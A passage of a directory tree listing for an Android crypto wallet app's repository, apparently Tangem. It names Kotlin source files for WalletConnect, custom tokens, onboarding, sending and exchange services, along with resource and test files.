│       │   │               │       │   └── WcSessionRequestConverter.kt
│       │   │               │       └── toggles
│       │   │               │           └── WalletConnectFeatureToggles.kt
│       │   │               ├── features
│       │   │               │   ├── BaseFragment.kt
│       │   │               │   ├── BaseStoreFragment.kt
│       │   │               │   ├── customtoken
│       │   │               │   │   ├── api
│       │   │               │   │   │   └── featuretoggles
│       │   │               │   │   │       └── CustomTokenFeatureToggles.kt
│       │   │               │   │   └── impl
│       │   │               │   │       ├── data
│       │   │               │   │       │   ├── converters
│       │   │               │   │       │   │   └── FoundTokenConverter.kt
│       │   │               │   │       │   └── DefaultCustomTokenRepository.kt
│       │   │               │   │       ├── di
│       │   │               │   │       │   ├── CustomTokenFeatureTogglesModule.kt
│       │   │               │   │       │   ├── CustomTokenInteractorModule.kt
│       │   │               │   │       │   └── CustomTokenRouterModule.kt
│       │   │               │   │       ├── domain
│       │   │               │   │       │   ├── CustomTokenInteractor.kt
│       │   │               │   │       │   ├── CustomTokenRepository.kt
│       │   │               │   │       │   ├── DefaultCustomTokenInteractor.kt
│       │   │               │   │       │   └── models
│       │   │               │   │       │       └── FoundToken.kt
│       │   │               │   │       ├── featuretoggles
│       │   │               │   │       │   └── DefaultCustomTokenFeatureToggles.kt
│       │   │               │   │       └── presentation
│       │   │               │   │           ├── AddCustomTokenFragment.kt
│       │   │               │   │           ├── models
│       │   │               │   │           │   ├── AddCustomTokenViewsModels.kt
│       │   │               │   │           │   ├── CustomTokenType.kt
│       │   │               │   │           │   └── SupportBlockchainType.kt
│       │   │               │   │           ├── routers
│       │   │               │   │           │   ├── CustomTokenRouter.kt
│       │   │               │   │           │   └── DefaultCustomTokenRouter.kt
│       │   │               │   │           ├── states
│       │   │               │   │           │   └── AddCustomTokenStateHolder.kt
│       │   │               │   │           ├── ui
│       │   │               │   │           │   ├── AddCustomTokenContent.kt
│       │   │               │   │           │   ├── AddCustomTokenPreviewData.kt
│       │   │               │   │           │   ├── AddCustomTokenScreen.kt
│       │   │               │   │           │   ├── AddCustomTokenTestContent.kt
│       │   │               │   │           │   └── components
│       │   │               │   │           │       ├── AddCustomTokenFloatingButton.kt
│       │   │               │   │           │       ├── AddCustomTokenForm.kt
│       │   │               │   │           │       ├── AddCustomTokenToolbar.kt
│       │   │               │   │           │       └── AddCustomTokenWarnings.kt
│       │   │               │   │           ├── validators
│       │   │               │   │           │   ├── ContractAddressValidator.kt
│       │   │               │   │           │   └── ContractAddressValidatorResult.kt
│       │   │               │   │           └── viewmodels
│       │   │               │   │               ├── AddCustomTokenAnalyticsSender.kt
│       │   │               │   │               └── AddCustomTokenViewModel.kt
│       │   │               │   ├── demo
│       │   │               │   │   ├── DefaultDemoModeDatasource.kt
│       │   │               │   │   ├── DemoHelper.kt
│       │   │               │   │   ├── DemoMiddleware.kt
│       │   │               │   │   ├── DemoOnboardingNoteMiddleware.kt
│       │   │               │   │   ├── di
│       │   │               │   │   │   └── DemoModule.kt
│       │   │               │   │   └── Extentions.kt
│       │   │               │   ├── details
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── DetailsAction.kt
│       │   │               │   │   │   ├── DetailsMiddleware.kt
│       │   │               │   │   │   ├── DetailsReducer.kt
│       │   │               │   │   │   ├── DetailsState.kt
│       │   │               │   │   │   └── walletconnect
│       │   │               │   │   │       ├── WalletConnectAction.kt
│       │   │               │   │   │       ├── WalletConnectMiddleware.kt
│       │   │               │   │   │       ├── WalletConnectReducer.kt
│       │   │               │   │   │       └── WalletConnectState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── appcurrency
│       │   │               │   │       │   ├── AppCurrencySelectorFragment.kt
│       │   │               │   │       │   ├── AppCurrencySelectorIntents.kt
│       │   │               │   │       │   ├── AppCurrencySelectorScreen.kt
│       │   │               │   │       │   ├── AppCurrencySelectorStateHolder.kt
│       │   │               │   │       │   ├── AppCurrencySelectorState.kt
│       │   │               │   │       │   ├── AppCurrencySelectorViewModel.kt
│       │   │               │   │       │   └── converter
│       │   │               │   │       │       └── CurrencyConverter.kt
│       │   │               │   │       ├── appsettings
│       │   │               │   │       │   ├── analytics
│       │   │               │   │       │   │   └── AppSettingsItemsAnalyticsSender.kt
│       │   │               │   │       │   ├── AppSettingsDialogsFactory.kt
│       │   │               │   │       │   ├── AppSettingsFragment.kt
│       │   │               │   │       │   ├── AppSettingsItemsFactory.kt
│       │   │               │   │       │   ├── AppSettingsScreen.kt
│       │   │               │   │       │   ├── AppSettingsScreenState.kt
│       │   │               │   │       │   ├── AppSettingsViewModel.kt
│       │   │               │   │       │   └── components
│       │   │               │   │       │       ├── SettingsAlertDialog.kt
│       │   │               │   │       │       ├── SettingsButtonItem.kt
│       │   │               │   │       │       ├── SettingsCardItem.kt
│       │   │               │   │       │       ├── SettingsSelectorDialog.kt
│       │   │               │   │       │       └── SettingsSwitchItem.kt
│       │   │               │   │       ├── cardsettings
│       │   │               │   │       │   ├── CardSettingsFragment.kt
│       │   │               │   │       │   ├── CardSettingsScreen.kt
│       │   │               │   │       │   ├── CardSettingsScreenState.kt
│       │   │               │   │       │   ├── CardSettingsViewModel.kt
│       │   │               │   │       │   └── coderecovery
│       │   │               │   │       │       ├── AccessCodeRecoveryFragment.kt
│       │   │               │   │       │       ├── AccessCodeRecoveryScreen.kt
│       │   │               │   │       │       ├── AccessCodeRecoveryScreenState.kt
│       │   │               │   │       │       └── AccessCodeRecoveryViewModel.kt
│       │   │               │   │       ├── common
│       │   │               │   │       │   └── DetailsComposeElements.kt
│       │   │               │   │       ├── details
│       │   │               │   │       │   ├── DetailsFragment.kt
│       │   │               │   │       │   ├── DetailsScreen.kt
│       │   │               │   │       │   ├── DetailsScreenState.kt
│       │   │               │   │       │   └── DetailsViewModel.kt
│       │   │               │   │       ├── resetcard
│       │   │               │   │       │   ├── di
│       │   │               │   │       │   │   └── ResetCardModule.kt
│       │   │               │   │       │   ├── featuretoggles
│       │   │               │   │       │   │   ├── DefaultResetCardFeatureToggles.kt
│       │   │               │   │       │   │   └── ResetCardFeatureToggles.kt
│       │   │               │   │       │   ├── ResetCardFragment.kt
│       │   │               │   │       │   ├── ResetCardScreen.kt
│       │   │               │   │       │   ├── ResetCardScreenState.kt
│       │   │               │   │       │   └── ResetCardViewModel.kt
│       │   │               │   │       ├── securitymode
│       │   │               │   │       │   ├── SecurityModeFragment.kt
│       │   │               │   │       │   ├── SecurityModeScreen.kt
│       │   │               │   │       │   ├── SecurityModeScreenState.kt
│       │   │               │   │       │   └── SecurityModeViewModel.kt
│       │   │               │   │       ├── utils
│       │   │               │   │       │   └── Mappers.kt
│       │   │               │   │       └── walletconnect
│       │   │               │   │           ├── dialogs
│       │   │               │   │           │   ├── BnbTransactionDialog.kt
│       │   │               │   │           │   ├── ClipboardOrScanQrDialog.kt
│       │   │               │   │           │   ├── PersonalSignDialog.kt
│       │   │               │   │           │   ├── SessionProposalDialog.kt
│       │   │               │   │           │   ├── SignTransactionDialog.kt
│       │   │               │   │           │   └── TransactionDialog.kt
│       │   │               │   │           ├── WalletConnectFragment.kt
│       │   │               │   │           ├── WalletConnectScreen.kt
│       │   │               │   │           ├── WalletConnectScreenState.kt
│       │   │               │   │           └── WalletConnectViewModel.kt
│       │   │               │   ├── disclaimer
│       │   │               │   │   ├── DisclaimerDataProvider.kt
│       │   │               │   │   ├── Disclaimer.kt
│       │   │               │   │   ├── DisclaimerType.kt
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── DisclaimerAction.kt
│       │   │               │   │   │   ├── DisclaimerMiddleware.kt
│       │   │               │   │   │   ├── DisclaimerReducer.kt
│       │   │               │   │   │   └── DisclaimerState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── DisclaimerFragment.kt
│       │   │               │   │       ├── DisclaimerWebViewClient.kt
│       │   │               │   │       └── LocalTermOfServices.kt
│       │   │               │   ├── home
│       │   │               │   │   ├── compose
│       │   │               │   │   │   ├── content
│       │   │               │   │   │   │   ├── Content.kt
│       │   │               │   │   │   │   ├── CurrenciesWeb3Content.kt
│       │   │               │   │   │   │   ├── FirstStoriesContent.kt
│       │   │               │   │   │   │   └── FloatingCardsContent.kt
│       │   │               │   │   │   ├── StoriesAnimation.kt
│       │   │               │   │   │   ├── StoriesScreen.kt
│       │   │               │   │   │   └── views
│       │   │               │   │   │       ├── HomeButtons.kt
│       │   │               │   │   │       ├── SearchCurrenciesButton.kt
│       │   │               │   │   │       ├── StoriesButton.kt
│       │   │               │   │   │       └── StoriesProgressBar.kt
│       │   │               │   │   ├── data
│       │   │               │   │   │   └── HomeRepositoryImpl.kt
│       │   │               │   │   ├── domain
│       │   │               │   │   │   └── HomeRepository.kt
│       │   │               │   │   ├── HomeFragment.kt
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── HomeAction.kt
│       │   │               │   │   │   ├── HomeMiddleware.kt
│       │   │               │   │   │   ├── HomeReducer.kt
│       │   │               │   │   │   └── HomeState.kt
│       │   │               │   │   └── RegionProvider.kt
│       │   │               │   ├── intentHandler
│       │   │               │   │   ├── handlers
│       │   │               │   │   │   ├── BackgroundScanIntentHandler.kt
│       │   │               │   │   │   └── WalletConnectLinkIntentHandler.kt
│       │   │               │   │   ├── IntentHandler.kt
│       │   │               │   │   └── IntentProcessor.kt
│       │   │               │   ├── main
│       │   │               │   │   ├── MainIntents.kt
│       │   │               │   │   ├── MainScreenStateHolder.kt
│       │   │               │   │   ├── MainViewModel.kt
│       │   │               │   │   ├── model
│       │   │               │   │   │   ├── ActionConfig.kt
│       │   │               │   │   │   ├── MainScreenState.kt
│       │   │               │   │   │   ├── ModalNotification.kt
│       │   │               │   │   │   └── Toast.kt
│       │   │               │   │   ├── NotificationsFactory.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── components
│       │   │               │   │       │   └── ModalNotificationScreen.kt
│       │   │               │   │       └── ModalNotificationBottomSheetFragment.kt
│       │   │               │   ├── onboarding
│       │   │               │   │   ├── OnboardingDialog.kt
│       │   │               │   │   ├── OnboardingHelper.kt
│       │   │               │   │   ├── OnboardingManager.kt
│       │   │               │   │   ├── OnboardingMenuProvider.kt
│       │   │               │   │   └── products
│       │   │               │   │       ├── BaseOnboardingFragment.kt
│       │   │               │   │       ├── note
│       │   │               │   │       │   ├── OnboardingNoteFragment.kt
│       │   │               │   │       │   └── redux
│       │   │               │   │       │       ├── OnboardingNoteAction.kt
│       │   │               │   │       │       ├── OnboardingNoteMiddleware.kt
│       │   │               │   │       │       ├── OnboardingNoteReducer.kt
│       │   │               │   │       │       └── OnboardingNoteState.kt
│       │   │               │   │       ├── otherCards
│       │   │               │   │       │   ├── OnboardingOtherCardsFragment.kt
│       │   │               │   │       │   └── redux
│       │   │               │   │       │       ├── OnboardingOtherCardsAction.kt
│       │   │               │   │       │       ├── OnboardingOtherCardsMiddleware.kt
│       │   │               │   │       │       ├── OnboardingOtherCardsReducer.kt
│       │   │               │   │       │       └── OnboardingOtherCardsState.kt
│       │   │               │   │       ├── twins
│       │   │               │   │       │   ├── redux
│       │   │               │   │       │   │   ├── TwinCardsAction.kt
│       │   │               │   │       │   │   ├── TwinCardsMiddleware.kt
│       │   │               │   │       │   │   ├── TwinCardsReducer.kt
│       │   │               │   │       │   │   └── TwinCardsState.kt
│       │   │               │   │       │   └── ui
│       │   │               │   │       │       ├── dialog
│       │   │               │   │       │       │   └── TwinningProcessNotCompletedDialog.kt
│       │   │               │   │       │       └── OnboardingTwinsFragment.kt
│       │   │               │   │       └── wallet
│       │   │               │   │           ├── redux
│       │   │               │   │           │   ├── OnboardingWalletAction.kt
│       │   │               │   │           │   ├── OnboardingWalletMiddleware.kt
│       │   │               │   │           │   ├── OnboardingWalletReducer.kt
│       │   │               │   │           │   └── OnboardingWalletState.kt
│       │   │               │   │           └── ui
│       │   │               │   │               ├── BackupAnimator.kt
│       │   │               │   │               ├── BackupInfoAdapter.kt
│       │   │               │   │               ├── dialogs
│       │   │               │   │               │   ├── AccessCodeDialog.kt
│       │   │               │   │               │   ├── AddMoreBackupCardsDialog.kt
│       │   │               │   │               │   ├── AttestationFailedDialog.kt
│       │   │               │   │               │   ├── BackupInProgressDialog.kt
│       │   │               │   │               │   ├── ConfirmDiscardingBackupDialog.kt
│       │   │               │   │               │   ├── InterruptOnboardingDialog.kt
│       │   │               │   │               │   ├── ResetBackupCardDialog.kt
│       │   │               │   │               │   ├── UnfinishedBackupFoundDialog.kt
│       │   │               │   │               │   └── WalletActivationErrorDialog.kt
│       │   │               │   │               ├── OnboardingSeedPhraseStateHandler.kt
│       │   │               │   │               ├── OnboardingWalletFragment.kt
│       │   │               │   │               └── WalletCardsWidget.kt
│       │   │               │   ├── saveWallet
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── SaveWalletAction.kt
│       │   │               │   │   │   ├── SaveWalletMiddleware.kt
│       │   │               │   │   │   ├── SaveWalletReducer.kt
│       │   │               │   │   │   └── SaveWalletState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── components
│       │   │               │   │       │   ├── EnrollBiometricsDialogConent.kt
│       │   │               │   │       │   └── SaveWalletScreenContent.kt
│       │   │               │   │       ├── models
│       │   │               │   │       │   └── EnrollBiometricsDialog.kt
│       │   │               │   │       ├── SaveWalletBottomSheetFragment.kt
│       │   │               │   │       ├── SaveWalletScreenState.kt
│       │   │               │   │       └── SaveWalletViewModel.kt
│       │   │               │   ├── send
│       │   │               │   │   ├── redux
│       │   │               │   │   │   ├── middlewares
│       │   │               │   │   │   │   ├── AddressMiddleware.kt
│       │   │               │   │   │   │   ├── AddressValidator.kt
│       │   │               │   │   │   │   ├── AmountMiddleware.kt
│       │   │               │   │   │   │   ├── RequestFeeMiddleware.kt
│       │   │               │   │   │   │   └── SendMiddleware.kt
│       │   │               │   │   │   ├── reducers
│       │   │               │   │   │   │   ├── AddressReducer.kt
│       │   │               │   │   │   │   ├── AmountReducer.kt
│       │   │               │   │   │   │   ├── FeeReducer.kt
│       │   │               │   │   │   │   ├── ReceiptReducer.kt
│       │   │               │   │   │   │   ├── SendScreenReducer.kt
│       │   │               │   │   │   │   └── TransactionExtrasReducer.kt
│       │   │               │   │   │   ├── SendScreenAction.kt
│       │   │               │   │   │   └── states
│       │   │               │   │   │       ├── AddressState.kt
│       │   │               │   │   │       ├── FeeState.kt
│       │   │               │   │   │       ├── ReceiptState.kt
│       │   │               │   │   │       └── SendState.kt
│       │   │               │   │   └── ui
│       │   │               │   │       ├── adapters
│       │   │               │   │       │   └── WarningMessagesAdapter.kt
│       │   │               │   │       ├── dialogs
│       │   │               │   │       │   ├── ChiaWarningDialog.kt
│       │   │               │   │       │   ├── KaspaWarningDialog.kt
│       │   │               │   │       │   ├── RequestFeeErrorDialog.kt
│       │   │               │   │       │   ├── SendTransactionFailsDialog.kt
│       │   │               │   │       │   └── TezosWarningDialog.kt
│       │   │               │   │       ├── EditTextCustomPaste.kt
│       │   │               │   │       ├── SendFragment.kt
│       │   │               │   │       ├── SendViewModel.kt
│       │   │               │   │       └── stateSubscribers
│       │   │               │   │           ├── FragmentStateSubscriber.kt
│       │   │               │   │           └── SendStateSubscriber.kt
│       │   │               │   ├── tokens
│       │   │               │   │   ├── impl
│       │   │               │   │   │   ├── data
│       │   │               │   │   │   │   ├── converters
│       │   │               │   │   │   │   │   ├── CoinsResponseConverter.kt
│       │   │               │   │   │   │   │   └── TestnetTokensConfigConverter.kt
│       │   │               │   │   │   │   ├── DefaultTokensListRepository.kt
│       │   │               │   │   │   │   ├── TangemApiTokensPagingSource.kt
│       │   │               │   │   │   │   └── TestnetTokensPagingSource.kt
│       │   │               │   │   │   ├── di
│       │   │               │   │   │   │   ├── TokensListInteractorModule.kt
│       │   │               │   │   │   │   ├── TokensListRepositoryModule.kt
│       │   │               │   │   │   │   └── TokensListRouterModule.kt
│       │   │               │   │   │   ├── domain
│       │   │               │   │   │   │   ├── DefaultTokensListInteractor.kt
│       │   │               │   │   │   │   ├── models
│       │   │               │   │   │   │   │   └── Token.kt
│       │   │               │   │   │   │   ├── TokensListInteractor.kt
│       │   │               │   │   │   │   └── TokensListRepository.kt
│       │   │               │   │   │   └── presentation
│       │   │               │   │   │       ├── models
│       │   │               │   │   │       │   └── SupportTokensState.kt
│       │   │               │   │   │       ├── router
│       │   │               │   │   │       │   ├── DefaultTokensListRouter.kt
│       │   │               │   │   │       │   └── TokensListRouter.kt
│       │   │               │   │   │       ├── states
│       │   │               │   │   │       │   ├── NetworkItemState.kt
│       │   │               │   │   │       │   ├── TokenItemState.kt
│       │   │               │   │   │       │   ├── TokensListStateHolder.kt
│       │   │               │   │   │       │   └── TokensListToolbarState.kt
│       │   │               │   │   │       ├── TokensListFragment.kt
│       │   │               │   │   │       ├── ui
│       │   │               │   │   │       │   ├── BriefNetworksList.kt
│       │   │               │   │   │       │   ├── DetailedNetworksList.kt
│       │   │               │   │   │       │   ├── NetworkItemArrow.kt
│       │   │               │   │   │       │   ├── TokenItem.kt
│       │   │               │   │   │       │   ├── TokenListPreviewData.kt
│       │   │               │   │   │       │   ├── TokensListScreen.kt
│       │   │               │   │   │       │   └── TokensListToolbar.kt
│       │   │               │   │   │       └── viewmodels
│       │   │               │   │   │           ├── TokensListAnalyticsSender.kt
│       │   │               │   │   │           ├── TokensListCryptoCurrencies.kt
│       │   │               │   │   │           ├── TokensListMigration.kt
│       │   │               │   │   │           └── TokensListViewModel.kt
│       │   │               │   │   └── legacy
│       │   │               │   │       └── redux
│       │   │               │   │           ├── TokensReducer.kt
│       │   │               │   │           └── TokensState.kt
│       │   │               │   ├── wallet
│       │   │               │   │   └── redux
│       │   │               │   │       └── middlewares
│       │   │               │   │           └── TradeCryptoMiddleware.kt
│       │   │               │   └── welcome
│       │   │               │       ├── redux
│       │   │               │       │   ├── WelcomeAction.kt
│       │   │               │       │   ├── WelcomeMiddleware.kt
│       │   │               │       │   ├── WelcomeReducer.kt
│       │   │               │       │   └── WelcomeState.kt
│       │   │               │       └── ui
│       │   │               │           ├── components
│       │   │               │           │   ├── WarningDialog.kt
│       │   │               │           │   └── WelcomeScreenContent.kt
│       │   │               │           ├── model
│       │   │               │           │   └── WarningModel.kt
│       │   │               │           ├── WelcomeFragment.kt
│       │   │               │           ├── WelcomeScreenState.kt
│       │   │               │           └── WelcomeViewModel.kt
│       │   │               ├── ForegroundActivityObserver.kt
│       │   │               ├── LockUserWalletsTimer.kt
│       │   │               ├── MainActivity.kt
│       │   │               ├── NavBarInsetsFragmentLifecycleCallback.kt
│       │   │               ├── network
│       │   │               │   ├── auth
│       │   │               │   │   ├── DefaultAppVersionProvider.kt
│       │   │               │   │   ├── DefaultAuthProvider.kt
│       │   │               │   │   ├── DefaultExpressAuthProvider.kt
│       │   │               │   │   ├── DefaultStakeKitAuthProvider.kt
│       │   │               │   │   └── di
│       │   │               │   │       └── AuthModule.kt
│       │   │               │   └── exchangeServices
│       │   │               │       ├── BuyExchangeService.kt
│       │   │               │       ├── CardExchangeRules.kt
│       │   │               │       ├── CryptoCurrencyConverter.kt
│       │   │               │       ├── CurrencyExchangeManager.kt
│       │   │               │       ├── DefaultRampManager.kt
│       │   │               │       ├── ExchangeService.kt
│       │   │               │       ├── mercuryo
│       │   │               │       │   ├── MercuryoApi.kt
│       │   │               │       │   ├── MercuryoEnvironment.kt
│       │   │               │       │   └── MercuryoService.kt
│       │   │               │       └── moonpay
│       │   │               │           ├── BlockchainExt.kt
│       │   │               │           ├── models
│       │   │               │           │   ├── MoonPayAvailableCurrency.kt
│       │   │               │           │   └── MoonPaySupportedCurrency.kt
│       │   │               │           ├── MoonPayApi.kt
│       │   │               │           └── MoonPayService.kt
│       │   │               ├── proxy
│       │   │               │   ├── AppStateHolder.kt
│       │   │               │   ├── di
│       │   │               │   │   └── ProxyModule.kt
│       │   │               │   ├── redux
│       │   │               │   │   ├── DaggerGraphAction.kt
│       │   │               │   │   ├── DaggerGraphMiddleware.kt
│       │   │               │   │   ├── DaggerGraphReducer.kt
│       │   │               │   │   └── DaggerGraphState.kt
│       │   │               │   ├── TransactionManagerImpl.kt
│       │   │               │   └── UserWalletManagerImpl.kt
│       │   │               ├── TangemApplication.kt
│       │   │               └── TangemHiltApplication.kt
│       │   └── res
│       │       ├── color
│       │       │   ├── selector_btn_content_primary.xml
│       │       │   ├── selector_btn_content_secondary.xml
│       │       │   ├── selector_btn_primary.xml
│       │       │   ├── selector_btn_secondary.xml
│       │       │   ├── selector_chip_shop_text.xml
│       │       │   ├── selector_chip_shop.xml
│       │       │   ├── selector_chip_stroke.xml
│       │       │   ├── selector_chip_text.xml
│       │       │   ├── selector_edit_text_secondary.xml
│       │       │   └── selector_edit_text.xml
│       │       ├── drawable
│       │       │   ├── bg_half_transparent_overlay.xml
│       │       │   ├── buy_with_googlepay_button_content.xml
│       │       │   ├── card_placeholder_white.xml
│       │       │   ├── currency0.webp
│       │       │   ├── currency1.webp
│       │       │   ├── currency2.webp
│       │       │   ├── currency3.webp
│       │       │   ├── currency4.webp
│       │       │   ├── dapps1.webp
│       │       │   ├── dapps2.webp
│       │       │   ├── dapps3.webp
│       │       │   ├── dapps4.webp
│       │       │   ├── dapps5.webp
│       │       │   ├── googlepay_button_no_shadow_background.xml
│       │       │   ├── googlepay_button_overlay.xml
│       │       │   ├── ic_accepted.xml
│       │       │   ├── ic_access_code.xml
│       │       │   ├── ic_add_friends.xml
│       │       │   ├── ic_angle_bracket_up.xml
│       │       │   ├── ic_arrow_collapsed.xml
│       │       │   ├── ic_arrow_extended.xml
│       │       │   ├── ic_arrow_refresh.xml
│       │       │   ├── ic_arrow_right.xml
│       │       │   ├── ic_arrows_up_down.xml
│       │       │   ├── ic_back_24.xml
│       │       │   ├── ic_baseline_arrow_back_24.xml
│       │       │   ├── ic_card_settings.xml
│       │       │   ├── ic_check_24.xml
│       │       │   ├── ic_clear_24.xml
│       │       │   ├── ic_copy_green.xml
│       │       │   ├── ic_cross_rounded_24.xml
│       │       │   ├── ic_dot.xml
│       │       │   ├── ic_feature_1.xml
│       │       │   ├── ic_feature_2.xml
│       │       │   ├── ic_feature_3.xml
│       │       │   ├── ic_fingerprint_24.xml
│       │       │   ├── ic_hide_password.xml
│       │       │   ├── ic_launcher_foreground.xml
│       │       │   ├── ic_link.xml
│       │       │   ├── ic_locked_24.xml
│       │       │   ├── ic_more_cards.xml
│       │       │   ├── ic_paste_disabled.xml
│       │       │   ├── ic_paste.xml
│       │       │   ├── ic_qr_code_scan.xml
│       │       │   ├── ic_qr_code_show.xml
│       │       │   ├── ic_selected_dot.xml
│       │       │   ├── ic_settings.xml
│       │       │   ├── ic_share_chip.xml
│       │       │   ├── ic_show_password.xml
│       │       │   ├── ic_tangem_logo.xml
│       │       │   ├── ic_unticked.xml
│       │       │   ├── img_alert_80.xml
│       │       │   ├── img_card_placeholder_wallet_2.webp
│       │       │   ├── img_flag_ru_24.xml
│       │       │   ├── img_hand_scan_ring.xml
│       │       │   ├── img_onboarding_success.xml
│       │       │   ├── img_ring_placeholder.png
│       │       │   ├── img_tangem_logo_96.xml
│       │       │   ├── inset_splash.xml
│       │       │   ├── paste_selector.xml
│       │       │   ├── selector_password_toggle.xml
│       │       │   ├── selector_tabs_dots.xml
│       │       │   ├── shape_circle.xml
│       │       │   ├── shape_ellipse.xml
│       │       │   ├── shape_line.xml
│       │       │   ├── shape_rectangle_rounded_100.xml
│       │       │   ├── shape_rectangle_rounded_4.xml
│       │       │   ├── shape_rectangle_rounded_8.xml
│       │       │   ├── shape_refresh_button.xml
│       │       │   ├── shape_success_circle.xml
│       │       │   └── splash_logo.xml
│       │       ├── drawable-de
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-fr
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-hdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-it
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-mdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-ru
│       │       │   └── buy_with_googlepay_button_content.xml
│       │       ├── drawable-xhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-xxhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── drawable-xxxhdpi
│       │       │   ├── card_placeholder_wallet.9.png
│       │       │   ├── googlepay_button_no_shadow_background_image.9.png
│       │       │   ├── img_meet_tangem.webp
│       │       │   ├── img_revolutionary_wallet.webp
│       │       │   └── img_tangem_for_everyone.webp
│       │       ├── font
│       │       │   ├── roboto_medium.ttf
│       │       │   ├── roboto.ttf
│       │       │   └── saira_semi_condensed_regular.ttf
│       │       ├── layout
│       │       │   ├── activity_main.xml
│       │       │   ├── btn_expand_collapse.xml
│       │       │   ├── buy_with_googlepay_button.xml
│       │       │   ├── dialog_onboarding_address_info.xml
│       │       │   ├── dialog_russians_cardholders_warning.xml
│       │       │   ├── fragment_disclaimer.xml
│       │       │   ├── fragment_onboarding_main.xml
│       │       │   ├── fragment_onboarding_wallet.xml
│       │       │   ├── fragment_send.xml
│       │       │   ├── item_backup_info_adapter.xml
│       │       │   ├── layout_backup_access_code_info.xml
│       │       │   ├── layout_backup_access_code_submit.xml
│       │       │   ├── layout_backup_access_code.xml
│       │       │   ├── layout_onboarding_buttons_add_cards.xml
│       │       │   ├── layout_onboarding_buttons_common.xml
│       │       │   ├── layout_onboarding_container_bottom.xml
│       │       │   ├── layout_onboarding_container_top.xml
│       │       │   ├── layout_onboarding_main.xml
│       │       │   ├── layout_onboarding_seed_phrase.xml
│       │       │   ├── layout_pseudo_toolbar.xml
│       │       │   ├── layout_receipt_total.xml
│       │       │   ├── layout_send_address.xml
│       │       │   ├── layout_send_amount.xml
│       │       │   ├── layout_send_fee.xml
│       │       │   ├── layout_send_receipt.xml
│       │       │   ├── layout_warning_card_action.xml
│       │       │   ├── layout_warning.xml
│       │       │   ├── lp_onboarding_create_wallet.xml
│       │       │   ├── lp_onboarding_done_activation_twins.xml
│       │       │   ├── lp_onboarding_done_activation.xml
│       │       │   ├── lp_onboarding_done.xml
│       │       │   ├── lp_onboarding_topup_wallet_twins.xml
│       │       │   ├── lp_onboarding_topup_wallet.xml
│       │       │   ├── test_leapfrog_fragment.xml
│       │       │   ├── test_leapfrog_widget.xml
│       │       │   ├── view_bg_twins_welcome.xml
│       │       │   ├── view_confetti.xml
│       │       │   ├── view_onboarding_card.xml
│       │       │   ├── view_onboarding_progress.xml
│       │       │   ├── view_onboarding_refresh_balance.xml
│       │       │   ├── view_onboarding_tv_balance.xml
│       │       │   ├── view_snackbar_max_amount_content.xml
│       │       │   └── view_snackbar_max_amount.xml
│       │       ├── layout-h680dp
│       │       │   └── layout_onboarding_container_bottom.xml
│       │       ├── menu
│       │       │   └── menu_onboarding.xml
│       │       ├── mipmap-anydpi-v26
│       │       │   └── ic_launcher.xml
│       │       ├── mipmap-hdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-mdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xxhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── mipmap-xxxhdpi
│       │       │   ├── ic_launcher_background.webp
│       │       │   └── ic_launcher.webp
│       │       ├── raw
│       │       │   └── anim_confetti.json
│       │       ├── values
│       │       │   ├── attrs.xml
│       │       │   ├── bool.xml
│       │       │   ├── colors.xml
│       │       │   ├── dimens.xml
│       │       │   ├── googlepay_strings.xml
│       │       │   ├── strings.xml
│       │       │   └── styles.xml
│       │       ├── values-h680dp
│       │       │   └── dimens.xml
│       │       ├── values-night
│       │       │   └── colors.xml
│       │       ├── values-v24
│       │       │   └── bool.xml
│       │       ├── values-v29
│       │       │   └── styles.xml
│       │       └── xml
│       │           ├── network_security_config.xml
│       │           └── provider_paths.xml
│       ├── mocked
│       │   └── res
│       │       ├── values
│       │       │   └── strings.xml
│       │       └── xml
│       │           └── network_security_config.xml
│       └── test
│           └── kotlin
│               └── com
│                   └── tangem
│                       └── tap
│                           └── domain
│                               └── card
│                                   ├── CryptoCurrenciesMocks.kt
│                                   ├── DefaultDerivationsRepositoryTest.kt
│                                   ├── DerivedKeysMocks.kt
│                                   ├── MissedDerivationsFinderTest.kt
│                                   └── ScanResponseMockFactory.kt
├── build.gradle.kts
├── common
│   ├── build.gradle.kts
│   └── src
│       └── main
│           └── java
│               └── com
│                   └── tangem
│                       └── common
│                           ├── module
│                           │   ├── ModuleErrorCode.kt
│                           │   └── ModuleMessage.kt
│                           └── Strings.kt
├── core
│   ├── analytics
│   │   ├── build.gradle.kts
│   │   ├── models
│   │   │   ├── build.gradle.kts
│   │   │   └── src
│   │   │       └── main
│   │   │           └── java
│   │   │               └── com
│   │   │                   └── tangem
│   │   │                       └── core
│   │   │                           └── analytics
│   │   │                               └── models
│   │   │                                   ├── AnalyticsEvent.kt
